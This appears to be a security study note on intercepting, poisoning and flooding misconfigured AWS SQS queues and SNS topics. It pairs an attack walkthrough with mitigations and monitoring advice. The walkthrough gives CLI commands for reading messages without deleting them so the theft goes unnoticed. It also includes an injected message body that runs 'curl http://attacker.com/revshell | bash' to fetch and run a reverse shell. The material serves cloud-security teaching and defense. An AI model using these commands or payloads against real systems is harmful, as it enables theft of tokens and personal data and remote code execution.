---
tags: [aws, sqs, sns, messaging, cloud, infrastructure]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.09 AWS SQS SNS"
---

# AWS SQS SNS — Message Queue Interception

## 1. Introduction to SQS and SNS
Amazon Simple Queue Service (SQS) is a fully managed message queuing service that enables the decoupling and scaling of microservices, distributed systems, and serverless applications. Amazon Simple Notification Service (SNS) is a highly available, durable, secure, fully managed pub/sub messaging service. 

Together, SNS and SQS are often used in an event-driven architecture. A typical pattern is the "fanout" pattern: an application publishes a message to an SNS Topic, and multiple SQS Queues subscribed to that topic receive a copy of the message.

Because these services handle the data flowing between microservices, they frequently process highly sensitive information, such as:
- Password reset tokens
- Personally Identifiable Information (PII)
- Financial transaction details
- Internal system state and configuration changes

When these queues and topics are misconfigured, attackers can intercept messages, inject malicious messages, or delete critical operational data, leading to severe security breaches.

## 2. Architecture and Resource-Based Policies
Unlike many AWS resources that only rely on Identity-Based Policies (attached to IAM users/roles), SQS and SNS heavily utilize **Resource-Based Policies** (Access Policies attached directly to the queue or topic).

These policies define *who* can perform *what* actions on the resource. A common mistake is using wildcard (`*`) principals or excessively broad condition keys, which can accidentally expose the queue or topic to unauthorized AWS accounts or the public internet.

### 2.1 The Anatomy of an SQS Access Policy
An overly permissive SQS policy might look like this:
```json
{
  "Version": "2012-10-17",
  "Id": "ExposedQueuePolicy",
  "Statement": [
    {
      "Sid": "AllowPublicReadWrite",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "sqs:SendMessage",
        "sqs:ReceiveMessage",
        "sqs:GetQueueAttributes"
      ],
      "Resource": "arn:aws:sqs:us-east-1:123456789012:SensitiveDataQueue"
    }
  ]
}
```
In this example, `"Principal": "*"` means *anyone* in the world can send and receive messages from this queue, provided they know the queue URL.

## 3. Attack Vectors and Interception Mechanics

### 3.1 Message Interception (Eavesdropping)
If an attacker gains `sqs:ReceiveMessage` permissions (either via an exposed queue or compromised IAM credentials), they can pull messages from the queue. 

**The Visibility Timeout Mechanism:**
When a consumer receives a message from SQS, the message is temporarily hidden from other consumers for a defined period known as the *Visibility Timeout*. If the consumer processes the message successfully, they must call `sqs:DeleteMessage` to remove it permanently. If the attacker simply reads the message and lets the timeout expire, the message returns to the queue and the legitimate application will eventually process it. 
This allows an attacker to silently intercept and log sensitive data without disrupting the application flow, though it may introduce latency.

### 3.2 Message Injection / Poisoning
If an attacker has `sqs:SendMessage` or `sns:Publish` permissions, they can inject arbitrary messages into the system. Since backend microservices typically trust the integrity of messages arriving via internal SQS queues, they may blindly process the malicious payload.

Consequences of message injection include:
- **Remote Code Execution (RCE) / Command Injection**: If the consuming application unsafely deserializes the message or passes it to a shell.
- **Data Corruption**: Injecting forged financial transactions or state changes.
- **Server-Side Request Forgery (SSRF)**: If the message dictates a URL for a background worker to fetch.

### 3.3 Resource Exhaustion / DoS
An attacker with `sqs:SendMessage` can flood the queue with millions of junk messages. This not only incurs massive AWS billing charges but also clogs the queue, preventing legitimate messages from being processed in a timely manner (Denial of Service).

## 4. Attack Flow and Visual Architecture

```text
+-----------------------------------------------------------------------------------+
|  AWS Environment (Victim Account: 123456789012)                                   |
|                                                                                   |
|  +--------------------+                                                           |
|  | Frontend Web App   |                                                           |
|  | (Produces events)  |                                                           |
|  +---------+----------+                                                           |
|            |                                                                      |
|            | 1. sns:Publish (e.g., User Registration Data)                        |
|            v                                                                      |
|  +--------------------+         2. Fanout          +-----------------------+      |
|  |    SNS Topic       +--------------------------->| SQS Queue (Billing)   |      |
|  | "UserEventsTopic"  |                            +-----------------------+      |
|  +---------+----------+                                                           |
|            |                                                                      |
|            | 2. Fanout                                                            |
|            v                                                                      |
|  +--------------------+                                                           |
|  | SQS Queue          | <-- Misconfigured Access Policy: Principal "*"            |
|  | "WelcomeEmailQ"    |                                                           |
|  +---------+----------+                                                           |
|            |                                                                      |
+------------|----------------------------------------------------------------------+
             |
             | 3. sqs:ReceiveMessage (Interception)
             |
+------------v----------------------------------------------------------------------+
|                                 The Internet                                      |
|    +-------------------+                                                          |
|    | Attacker Machine  |  <-- Attacker pulls PII, Password Reset Links, etc.      |
|    +-------------------+                                                          |
+-----------------------------------------------------------------------------------+
```

## 5. Exploitation Walkthrough

### 5.1 Reconnaissance and Enumeration
An attacker with low-level AWS credentials will first list all queues and topics, then query their attributes to read the resource policies.

List SQS Queues:
```bash
aws sqs list-queues --region us-east-1
```
Check SQS Queue Attributes (specifically the Access Policy):
```bash
aws sqs get-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/WelcomeEmailQ \
  --attribute-names Policy
```
If the policy shows `Principal: *` without `Condition` blocks restricting to a specific `aws:SourceVpc` or `aws:SourceOwner`, it is vulnerable.

### 5.2 Intercepting Messages
To continuously poll the queue and intercept messages, the attacker uses the AWS CLI. To avoid disrupting the application, the attacker does NOT delete the messages.

```bash
aws sqs receive-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/WelcomeEmailQ \
  --max-number-of-messages 10 \
  --visibility-timeout 10
```
*Note: A short visibility timeout ensures the message quickly returns to the queue for the legitimate worker to process, minimizing suspicion.*

The attacker inspects the JSON payload:
```json
{
  "Messages": [
    {
      "MessageId": "a1b2c3d4-...",
      "ReceiptHandle": "AQEB...",
      "MD5OfBody": "...",
      "Body": "{\"user_id\":\"9876\",\"email\":\"admin@target.com\",\"reset_token\":\"SUPER_SECRET_TOKEN\"}"
    }
  ]
}
```
The attacker has now successfully extracted a password reset token meant for a background email-sending service and can use it to compromise the admin account.

### 5.3 Injecting Malicious Messages
If the queue processes image resizing or data parsing, the attacker can push a forged message:
```bash
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/ImageProcessingQ \
  --message-body '{"image_url": "http://attacker.com/malicious_payload.jpg; curl http://attacker.com/revshell | bash"}'
```
If the backend worker is vulnerable to command injection via the `image_url` parameter, this results in immediate RCE.

## 6. Advanced Concept: Cross-Account Access Flaws
Organizations often intentionally grant cross-account access (e.g., Account A publishes to Account B's queue). 
If the policy in Account B is misconfigured to allow access from an attacker's Account C (e.g., via a wildcard in the account ID `arn:aws:iam::*:root` or trusting a third-party vendor that was compromised), the queue is exposed.

## 7. Mitigation and Best Practices

### 7.1 Least Privilege Resource Policies
Never use `"Principal": "*"` in SQS or SNS access policies unless there is a strict `Condition` block. 
If an SNS topic must publish to an SQS queue, use the `aws:SourceArn` condition to guarantee that ONLY the specific SNS topic can send messages to the queue.

Secure Policy Example:
```json
{
  "Version": "2012-10-17",
  "Id": "SecureQueuePolicy",
  "Statement": [
    {
      "Sid": "AllowSNSTopic",
      "Effect": "Allow",
      "Principal": {
        "Service": "sns.amazonaws.com"
      },
      "Action": "sqs:SendMessage",
      "Resource": "arn:aws:sqs:us-east-1:123456789012:WelcomeEmailQ",
      "Condition": {
        "ArnEquals": {
          "aws:SourceArn": "arn:aws:sns:us-east-1:123456789012:UserEventsTopic"
        }
      }
    }
  ]
}
```

### 7.2 Encryption at Rest and in Transit
- **SSE (Server-Side Encryption)**: Enable KMS encryption for SQS and SNS. This ensures that even if an attacker manages to bypass network controls and read the raw storage layer (highly unlikely in AWS), the data is encrypted. More importantly, it requires the attacker to *also* have `kms:Decrypt` permissions on the associated Customer Managed Key (CMK) to read intercepted messages.
- Always enforce TLS/SSL in transit using the `aws:SecureTransport` condition key.

### 7.3 Dead Letter Queues (DLQs)
Implement Dead Letter Queues to capture messages that fail processing multiple times. Monitor the DLQ for poisoned messages or injection attempts, which can serve as an early warning system for an attack.

## 8. Detection and Monitoring

### 8.1 AWS CloudTrail
Monitor CloudTrail for changes to SQS/SNS policies (`SetQueueAttributes`, `SetTopicAttributes`).
Log Data Events: SQS data plane actions (`SendMessage`, `ReceiveMessage`, `DeleteMessage`) are not logged by default in CloudTrail because they are high volume. They must be explicitly enabled via CloudTrail Data Events, though this can be expensive.

### 8.2 Amazon Macie & DLP
While Macie focuses on S3, any messages archived from SNS/SQS to S3 should be scanned for leaked PII or secrets.

## 9. Chaining Opportunities
- **[[12 - AWS IAM Privilege Escalation]]**: If the intercepted messages contain AWS temporary credentials or access keys (sometimes passed in automated CI/CD pipelines).
- **[[02 - SSRF in Cloud Environments]]**: Injecting SSRF payloads into SQS queues to attack backend worker nodes that reside in isolated, highly privileged private subnets.
- **[[15 - Serverless Security (AWS Lambda)]]**: SQS is a primary event source for Lambda. Poisoning the queue directly leads to exploiting vulnerabilities within the consuming Lambda functions.

## 10. Related Notes
- [[10 - AWS API Gateway — Authorization Bypass]]
- [[11 - AWS Cognito — Misconfigured User Pools]]
- [[04 - Event-Driven Architecture Security]]
